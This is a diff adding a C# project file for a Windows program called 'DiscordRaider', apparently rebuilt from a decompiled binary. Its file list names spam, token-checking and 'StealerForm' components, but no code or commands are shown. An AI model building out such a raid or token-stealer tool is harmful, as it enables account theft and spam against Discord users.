@@ -1,0 +1,143 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{81F41438-3C2F-47A3-AD97-99B2BD618CAA}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>DiscordRaider</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>1.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>DiscordRaider</RootNamespace>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="RaidAPI">
+      <HintPath>lib\RaidAPI.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="_003CModule_003E.cs" />
+    <Compile Include="RoundBtn.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="ProcessedByFody.cs" />
+    <Compile Include="FormSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CheckTokens.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="EmbedColor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ChangeNick.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="EmojiList.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TextStuff.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ServerInfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SpamMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Mouse.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="LeaveText.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TokenInfos.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HypeStuff.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Main.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TokenSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="UpdateStatus.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="StealerForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="setServerNick.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="ChangeNick.resx" />
+    <EmbeddedResource Include="CheckTokens.resx" />
+    <EmbeddedResource Include="costura\discord\net\core\dll.zip" />
+    <EmbeddedResource Include="costura\discord\net\rest\dll.zip" />
+    <EmbeddedResource Include="costura\discord\net\websocket\dll.zip" />
+    <EmbeddedResource Include="costura\microsoft\toolkit\forms\ui\controls\webview\dll.zip" />
+    <EmbeddedResource Include="costura\mono\cecil\dll.zip" />
+    <EmbeddedResource Include="costura\newtonsoft\json\dll.zip" />
+    <EmbeddedResource Include="costura\raidapi\dll.zip" />
+    <EmbeddedResource Include="costura\raidapi\pdb.zip" />
+    <EmbeddedResource Include="costura\system\collections\immutable\dll.zip" />
+    <EmbeddedResource Include="costura\system\interactive\async\dll.zip" />
+    <EmbeddedResource Include="costura\system\net\http\extensions\dll.zip" />
+    <EmbeddedResource Include="costura\system\net\http\formatting\dll.zip" />
+    <EmbeddedResource Include="costura\system\net\http\primitives\dll.zip" />
+    <EmbeddedResource Include="EmbedColor.resx" />
+    <EmbeddedResource Include="EmojiList.resx" />
+    <EmbeddedResource Include="FormSettings.resx" />
+    <EmbeddedResource Include="HypeStuff.resx" />
+    <EmbeddedResource Include="LeaveText.resx" />
+    <EmbeddedResource Include="Main.resx" />
+    <EmbeddedResource Include="Properties\Resources.resx" />
+    <EmbeddedResource Include="ServerInfo.resx" />
+    <EmbeddedResource Include="setServerNick.resx" />
+    <EmbeddedResource Include="SpamMain.resx" />
+    <EmbeddedResource Include="StealerForm.resx" />
+    <EmbeddedResource Include="TextStuff.resx" />
+    <EmbeddedResource Include="TokenInfos.resx" />
+    <EmbeddedResource Include="TokenSettings.resx" />
+    <EmbeddedResource Include="UpdateStatus.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\PoweredByByteTools.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
